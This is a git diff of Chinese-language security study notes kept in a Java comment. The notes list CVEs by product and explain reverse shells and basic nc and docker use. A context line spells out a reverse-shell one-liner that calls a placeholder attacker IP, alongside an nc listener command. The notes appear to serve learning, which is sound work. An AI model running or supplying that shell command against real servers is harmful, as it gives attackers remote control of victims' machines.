@@ -74,7 +74,7 @@ public class Summary1 {
      * Apache Dubbo Provider默认反序列漏洞（CVE-2020-1948）
      *
      * sharding
-     * CVE-2020-1947：ShardingSphere RCE
+     * ShardingSphere RCE (CVE-2020-1947)
      *
      *
      * jboss
@@ -84,12 +84,13 @@ public class Summary1 {
      *
      *
      * ssrf
-     * 任意文件读取、文件上传
-     * 远程代码执行
+     * CVE-2021-40438（有点难）
+     * CVE-2014-4210
+     *
      *
      *
      * docker
-     *  docker逃逸 Docker版本 < 18.09.2，runC版本< 1.0-rc6。
+     *  docker逃逸 Docker版本 < 18.09.2，runC版本< 1.0-rc6。 (CVE-2019-5736)
      *
      *
      * springcloud
@@ -97,8 +98,8 @@ public class Summary1 {
      *
      * struts
      * Struts2 S2-045远程代码执行漏洞（CVE-2017-5638）
+     * Struts2 S2-059 远程代码执行 (CVE-2019-0230)
      * Struts2 S2-061远程代码执行漏洞（CVE-2020-17530）
-     * Struts2 S2-059 远程代码执行 CVE-2019-0230：
      *
      * Hadoop
      * Spring-data-commons(CVE-2018-1273)
@@ -107,18 +108,18 @@ public class Summary1 {
      * Apache Spark远程命令执行漏洞
      *
      * sqlserver
-     * CVE-2020-0618：SQL Server 远程代码执行
+     * SQL Server 远程代码执行(CVE-2020-0618)
      *
      * tomcat
-     * Tomcat任意文件写入漏洞（CVE-2017-12615）
-     * Tomcat Session 反序列化 CVE-2020-9484
-     * CVE-2020-1938：Apache Tomcat文件包含
+     * Tomcat任意文件写入漏洞 (CVE-2017-12615)
+     * Tomcat Session 反序列化 (CVE-2020-9484)
+     * Apache Tomcat文件包含 (CVE-2020-1938)
      *
      * django
-     * CVE-2020-7471：Django SQL注入漏洞
+     * Django SQL注入漏洞(CVE-2020-7471)
      *
      * freemarker
-     * CVE-2020-7799：FreeMarker模板FusionAuth RCE
+     * FreeMarker模板FusionAuth RCE (CVE-2020-7799)
      *
      * nginx
      * Nginx 拒绝服务漏洞(CVE-2019-9513、CVE-2019-9511)
@@ -130,18 +131,20 @@ public class Summary1 {
      * Apache Solr JMX服务 RCE 漏洞
      *
      * weblogic
-     * WebLogic后台命令执行漏洞（CVE-2021-2109）
-     * Weblogic前台验证绕过+后台命令执行漏洞复现（CVE-2020-14882、CVE-2020-14883）
-     * Weblogic前台验证绕过漏洞复现（CVE-2020-14750）
+     * WebLogic后台命令执行漏洞（）
+     * Weblogic前台验证绕过+后台命令执行漏洞（CVE-2020-14882、CVE-2020-14883）
+     * Weblogic前台验证绕过漏洞（CVE-2020-14750）
      * WebLogic任意文件上传漏洞(CVE-2019-2618)
-     * CVE-2020-14825：Weblogic反序列化漏洞
+     * Weblogic反序列化漏洞 (CVE-2020-14825)
+     * Weblogic远程代码执行（CVE-2020-14645） 复现失败了
+     * Weblogic SSRF漏洞 (CVE-2014-4210)
      *
      *
      * shiro
-     * CVE-2020-11989：Apache Shiro权限绕过
+     * Apache Shiro权限绕过 (CVE-2020-11989)
      *
      * openssh
-     * CVE-2020-15778：OpenSSH命令注入漏洞
+     * OpenSSH命令注入漏洞 (CVE-2020-15778)
      *
      *
      *  邮件安全
@@ -175,7 +178,12 @@ public class Summary1 {
      * ==============================================================
      * 反弹shell
      * 为什么要反弹shell
-     * 用户是在局域网里 不好直接连接，就让用户主动连接攻击者 连接上之后 就可以给他发请求了 例如ls什么的
+     * 反弹shell前提是已经进入对方服务器 ，但是直接在对方服务器上操作命令就不安全
+     * 所以通过对方服务器上连接攻击者本地开启的服务器
+     * 然后就两者之间发请求 并把输入重定向到攻击者端
+     *
+     * 除了nc 还有bash -i等
+     *
      * 怎么反弹
      * 攻击者打开端口等待连接：nc -lvp 4444
      * 被攻击者运行反弹命令（被攻击者怎么运行 其实就是在该服务器网站上找个输入的入口 写入命令就好了）：bash -i >& /dev/tcp/攻击者IP/4444 0>&1
@@ -194,6 +202,17 @@ public class Summary1 {
      *
      * CRLF是回车+换行（\r\n）的简称 十六进制编码分别为0x0d和0x0a
      * Http header与http body是用两个CRLF分割的 浏览器就是根据这两个CRLF来取出HTTP内容并显示出来
+     *
+     *
+     * 什么是nc nc的作用
+     * nc可以端口扫描、文件传输、开启端口、端口转发、远程控制
+     *
+     * docker使用
+     * docker search Java
+     * docker pull 镜像名字
+     * docker run -it --name jdk1.8 -d primetoninc/jdk:1.8
+     * （前面的jdk1.8是别名 后面的primetoninc/jdk:1.8是镜像名）
+     *
      *
      *
      *
